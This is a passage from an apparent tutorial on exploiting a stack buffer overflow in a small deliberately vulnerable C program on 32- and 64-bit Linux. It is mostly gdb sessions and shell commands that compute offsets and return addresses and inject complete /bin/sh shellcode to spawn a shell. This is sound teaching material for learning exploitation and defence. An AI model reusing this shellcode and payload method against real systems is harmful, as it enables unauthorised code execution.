Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) b *vulnerable+22
Breakpoint 1 at 0x8048461: file easy.c, line 14.
(gdb) r `perl -e 'print "A"x0x40c, "B"x0x4'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/howard/repos/bof/easy32 `perl -e 'print "A"x0x40c, "B"x0x4'`

Breakpoint 1, 0x08048461 in vulnerable (input=0xffffd7e6 'A' <repeats 200 times>...) at easy.c:14
14        strcpy(buffer, input);
(gdb) i r
eax            0xffffd180    -11904
ecx            0xffffd5c0    -10816
edx            0xffffd5e4    -10780
ebx            0x0    0
esp            0xffffd170    0xffffd170
ebp            0xffffd588    0xffffd588
esi            0x2    2
edi            0xf7fb0000    -134545408
eip            0x8048461    0x8048461 <vulnerable+22>
eflags         0x296    [ PF AF SF IF ]
cs             0x23    35
ss             0x2b    43
ds             0x2b    43
es             0x2b    43
fs             0x0    0
gs             0x63    99
(gdb) 
```

The first line fills the buffer and the saved `%ebp` with "A"s then overwrites the saved `%eip` with "B"s; this ensures that the calculation of bytes needed is correct. Then the program is stopped just before the call to `strcpy` and the registers are inspected. This yields the following calculation for the address of the buffer: `%ebp` - 0x408 = 0xffffd588 - 0x408 = 0xffffd180.

```
(gdb) r `perl -e 'print "\x31\xff\x57\xeb\x2b\x8b\x3c\x24\x31\xd2\xb2\x41\x30\x57\x07\x8b\x7c\x24\x04\x30\x57\x02\x8b\x1c\x24\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3d4, "\x80\xd1\xff\xff"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/howard/repos/bof/easy32 `perl -e 'print "\x31\xff\x57\xeb\x2b\x8b\x3c\x24\x31\xd2\xb2\x41\x30\x57\x07\x8b\x7c\x24\x04\x30\x57\x02\x8b\x1c\x24\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3d4, "\x80\xd1\xff\xff"'`
Input: 1�W�+�<$1ҲA0W�|$0W�$��1�1��
                                     �����/bin/shA�����-pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
process 2890 is executing new program: /usr/bin/bash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
sh-4.3$
``` 

This time, the beginning of the buffer is filled with the shellcode, which is followed with enough "A"s to completely fill the buffer and overwrite the saved `%ebp`. Finally, the location of the buffer ("0xffffd180") is written to overwrite the saved `$eip`. The number of "A"s written was adjusted to account for the length (in bytes) of the shellcode: 0x40c - 0x38 = 0x3d4. The program outputs the buffer correctly as written then returns from the `vulnerable` function to the address "0xffffd180", which contains the beginning of the shellcode. When the shellcode executes, it spawns the "/bin/sh" program and starts a shell as denoted by the prompt "sh-4.3$".

All of this works while inside a debugging environment, so what about just executing the program with the malicious data outside of gdb?

```
[howard@sterling shellcodes]$ /home/howard/repos/bof/easy32 `perl -e 'print "\x31\xff\x57\xeb\x2b\x8b\x3c\x24\x31\xd2\xb2\x41\x30\x57\x07\x8b\x7c\x24\x04\x30\x57\x02\x8b\x1c\x24\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3d4, "\x80\xd1\xff\xff"'`
Input: 1�W�+�<$1ҲA0W�|$0W�$��1�1��
                                     �����/bin/shA�����-pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault (core dumped)
```

The program executed correctly, but this time a segmentation fault occurred instead of executing a shell. This happens because the return address is no longer correct. The address calculated inside the debugger works inside the debugger because gdb sets some environment variables for itself that are passed to the program being debugged. The full definition of the main function is `int main(int argc, char * argv[], char * envp[])`, so the environment variables are also passed on the stack to the program, therefore, they will adjust the memory addresses of anything put on the stack later. We can use the `env` command to figure out how big the environment is outside of the debugger as well as inside the debugger:

```
[howard@sterling shellcodes]$ env > shell.env
[howard@sterling shellcodes]$ gdb -q ../easy32
Reading symbols from ../easy32...done.
(gdb) r `env > gdb.env`
Starting program: /home/howard/repos/bof/easy32 `env > gdb.env`
[Inferior 1 (process 2920) exited with code 01]
(gdb) q
[howard@sterling shellcodes]$ wc -c shell.env 
1004 shell.env
[howard@sterling shellcodes]$ wc -c gdb.env
995 gdb.env
```

This shows that the environment outside the debugger is actually 9 bytes larger than it is inside gdb; therefore, subtracting 9 from the original address should yield the new return address. The operation for this is subtraction because more data on the stack pushes the stack down to lower memory addresses, and there are 9 more bytes outside the debugger.

```
[howard@sterling shellcodes]$ /home/howard/repos/bof/easy32 `perl -e 'print "\x31\xff\x57\xeb\x2b\x8b\x3c\x24\x31\xd2\xb2\x41\x30\x57\x07\x8b\x7c\x24\x04\x30\x57\x02\x8b\x1c\x24\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3d4, "\x77\xd1\xff\xff"'`
Input: 1�W�+�<$1ҲA0W�|$0W�$��1�1��
                                     �����/bin/shA�����-pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw���
Segmentation fault (core dumped)
```

Even though the return address was adjusted to account for the extra 9 bytes of environment variables, the program still crashes indicating the return address is still not correct. An examination of the `main` function reveals why:

```
[howard@sterling shellcodes]$ gdb -q ../easy32
Reading symbols from ../easy32...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048483 <+0>:    lea    0x4(%esp),%ecx
   0x08048487 <+4>:    and    $0xfffffff0,%esp
   0x0804848a <+7>:    pushl  -0x4(%ecx)
   0x0804848d <+10>:    push   %ebp
   0x0804848e <+11>:    mov    %esp,%ebp
   0x08048490 <+13>:    push   %ecx
   0x08048491 <+14>:    sub    $0x4,%esp
   0x08048494 <+17>:    mov    %ecx,%eax
   0x08048496 <+19>:    cmpl   $0x2,(%eax)
   0x08048499 <+22>:    je     0x80484a5 <main+34>
   0x0804849b <+24>:    sub    $0xc,%esp
   0x0804849e <+27>:    push   $0x1
   0x080484a0 <+29>:    call   0x8048320 <exit@plt>
   0x080484a5 <+34>:    mov    0x4(%eax),%eax
   0x080484a8 <+37>:    add    $0x4,%eax
   0x080484ab <+40>:    mov    (%eax),%eax
   0x080484ad <+42>:    sub    $0xc,%esp
   0x080484b0 <+45>:    push   %eax
   0x080484b1 <+46>:    call   0x804844b <vulnerable>
   0x080484b6 <+51>:    add    $0x10,%esp
   0x080484b9 <+54>:    mov    $0x0,%eax
   0x080484be <+59>:    mov    -0x4(%ebp),%ecx
   0x080484c1 <+62>:    leave  
   0x080484c2 <+63>:    lea    -0x4(%ecx),%esp
   0x080484c5 <+66>:    ret    
End of assembler dump.
```

The second line of the output shows what causes the address to be wrong. The compiled output wants to nibble align the stack starting in the `main` function, so it truncates the least significant nibble of the stack pointer thus shifting the stack down. Taking this into account, the new calculation should be: (0xffffd180 - 9) & 0xfffffff0 = 0xffffd170

```
[howard@sterling shellcodes]$ /home/howard/repos/bof/easy32 `perl -e 'print "\x31\xff\x57\xeb\x2b\x8b\x3c\x24\x31\xd2\xb2\x41\x30\x57\x07\x8b\x7c\x24\x04\x30\x57\x02\x8b\x1c\x24\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3d4, "\x70\xd1\xff\xff"'`
Input: 1�W�+�<$1ҲA0W�|$0W�$��1�1��
                                     �����/bin/shA�����-pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp���
sh-4.3$ 
```

The adjusted address works perfectly and spawns a shell! The 64-bit version of this attack works almost exactly the same: use the debugger to figure out how much data is needed to fill the buffer and the unadjusted return address location, put the 64-bit shellcode in the input string followed by the "A"s and the return address, then adjust the return address for the environment difference and the byte alignment.

```
[howard@sterling shellcodes]$ cat shell3_64.sc
\x48\x31\xff\x57\xeb\x34\x4c\x8b\x04\x24\x4d\x31\xc9\x41\xb1\x41\x45\x30\x48\x07\x4c\x89\xc7\x4c\x8b\x44\x24\x08\x4d\x31\x48\x02\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41
[howard@sterling shellcodes]$ cat shell3_64.sc | wc -c 
265
[howard@sterling shellcodes]$ gdb -q ../easy64 
Reading symbols from ../easy64...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004005bd <+0>:    push   %rbp
   0x00000000004005be <+1>:    mov    %rsp,%rbp
   0x00000000004005c1 <+4>:    sub    $0x10,%rsp
   0x00000000004005c5 <+8>:    mov    %edi,-0x4(%rbp)
   0x00000000004005c8 <+11>:    mov    %rsi,-0x10(%rbp)
   0x00000000004005cc <+15>:    cmpl   $0x2,-0x4(%rbp)
   0x00000000004005d0 <+19>:    je     0x4005dc <main+31>
   0x00000000004005d2 <+21>:    mov    $0x1,%edi
   0x00000000004005d7 <+26>:    callq  0x400460 <exit@plt>
   0x00000000004005dc <+31>:    mov    -0x10(%rbp),%rax
   0x00000000004005e0 <+35>:    add    $0x8,%rax
   0x00000000004005e4 <+39>:    mov    (%rax),%rax
   0x00000000004005e7 <+42>:    mov    %rax,%rdi
   0x00000000004005ea <+45>:    callq  0x400576 <vulnerable>
   0x00000000004005ef <+50>:    mov    $0x0,%eax
   0x00000000004005f4 <+55>:    leaveq 
   0x00000000004005f5 <+56>:    retq   
End of assembler dump.
(gdb) disas vulnerable
Dump of assembler code for function vulnerable:
   0x0000000000400576 <+0>:    push   %rbp
   0x0000000000400577 <+1>:    mov    %rsp,%rbp
   0x000000000040057a <+4>:    sub    $0x410,%rsp
   0x0000000000400581 <+11>:    mov    %rdi,-0x408(%rbp)
   0x0000000000400588 <+18>:    mov    -0x408(%rbp),%rdx
   0x000000000040058f <+25>:    lea    -0x400(%rbp),%rax
   0x0000000000400596 <+32>:    mov    %rdx,%rsi
   0x0000000000400599 <+35>:    mov    %rax,%rdi
   0x000000000040059c <+38>:    callq  0x400430 <strcpy@plt>
   0x00000000004005a1 <+43>:    lea    -0x400(%rbp),%rax
   0x00000000004005a8 <+50>:    mov    %rax,%rsi
   0x00000000004005ab <+53>:    mov    $0x400684,%edi
   0x00000000004005b0 <+58>:    mov    $0x0,%eax
   0x00000000004005b5 <+63>:    callq  0x400440 <printf@plt>
   0x00000000004005ba <+68>:    nop
   0x00000000004005bb <+69>:    leaveq 
   0x00000000004005bc <+70>:    retq   
End of assembler dump.
(gdb) b *vulnerable+38
(gdb) r `perl -e 'print "A"x0x408, "B"x6'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/howard/repos/bof/easy64 `perl -e 'print "A"x0x408, "B"x6'`

Breakpoint 1, 0x000000000040059c in vulnerable ()
(gdb) i r
rax            0x7fffffffe020    140737488347168
rbx            0x0    0
rcx            0x0    0
rdx            0x7fffffffe7e8    140737488349160
rsi            0x7fffffffe7e8    140737488349160
rdi            0x7fffffffe020    140737488347168
rbp            0x7fffffffe420    0x7fffffffe420
rsp            0x7fffffffe010    0x7fffffffe010
r8             0x400670    4195952
r9             0x7ffff7de88b0    140737351944368
r10            0x846    2118
r11            0x7ffff7a58650    140737348208208
r12            0x400480    4195456
r13            0x7fffffffe520    140737488348448
r14            0x0    0
r15            0x0    0
rip            0x40059c    0x40059c <vulnerable+38>
eflags         0x202    [ IF ]
cs             0x33    51
ss             0x2b    43
ds             0x0    0
es             0x0    0
fs             0x0    0
gs             0x0    0
(gdb) c
Continuing.
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
(gdb) r `perl -e 'print "\x48\x31\xff\x57\xeb\x34\x4c\x8b\x04\x24\x4d\x31\xc9\x41\xb1\x41\x45\x30\x48\x07\x4c\x89\xc7\x4c\x8b\x44\x24\x08\x4d\x31\x48\x02\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3c6, "\x20\xe0\xff\xff\xff\x7f"'`
Starting program: /home/howard/repos/bof/easy64 `perl -e 'print "\x48\x31\xff\x57\xeb\x34\x4c\x8b\x04\x24\x4d\x31\xc9\x41\xb1\x41\x45\x30\x48\x07\x4c\x89\xc7\x4c\x8b\x44\x24\x08\x4d\x31\x48\x02\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3c6, "\x20\xe0\xff\xff\xff\x7f"'`
[Inferior 1 (process 3688) exited with code 01]
(gdb)
```

This time, the debugger starts the process and then immediately exits with code 1. The source code for the "easy.c" program exits immediately from the main function if the total length of `argv` is longer than 2. As it turns out, the least significant byte of the return address in this case is `\x20`, which is also the ASCII value for a space. This limitation can be worked around by placing the full exploit string in a file and having the shell read the exploit string before passing it as the argument, which will make quoting the whole string easier.

```
[howard@sterling shellcodes]$ perl -e 'print "\x48\x31\xff\x57\xeb\x34\x4c\x8b\x04\x24\x4d\x31\xc9\x41\xb1\x41\x45\x30\x48\x07\x4c\x89\xc7\x4c\x8b\x44\x24\x08\x4d\x31\x48\x02\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3c6, "\x20\xe0\xff\xff\xff\x7f"' > input
[howard@sterling shellcodes]$ gdb -q ../easy64 
Reading symbols from ../easy64...(no debugging symbols found)...done.
(gdb) r "$(cat input)"
Starting program: /home/howard/repos/bof/easy64 "$(cat input)"
Input: H1�W�4L�$M1�A�AE0HL��L�DM1HH��H1�H1��;�����/bin/shA�����-pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ����
process 3680 is executing new program: /usr/bin/bash
sh-4.3$ exit
exit
[Inferior 1 (process 3680) exited normally]
(gdb)
```

With the small caveat of the return address having an ASCII space character in it, this attack works almost exactly the same as the 32-bit version inside the debugger. The same can be said for doing this outside of the debugger. Subtract 9 bytes (for the environment difference) from the return address and nibble align the result.

```
[howard@sterling shellcodes]$ perl -e 'print "\x48\x31\xff\x57\xeb\x34\x4c\x8b\x04\x24\x4d\x31\xc9\x41\xb1\x41\x45\x30\x48\x07\x4c\x89\xc7\x4c\x8b\x44\x24\x08\x4d\x31\x48\x02\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\xe8\xee\xff\xff\xff\x2d\x70\x41", "A"x0x3c6, "\x10\xe0\xff\xff\xff\x7f"' > input
[howard@sterling shellcodes]$ /home/howard/repos/bof/easy64 "$(cat input)"
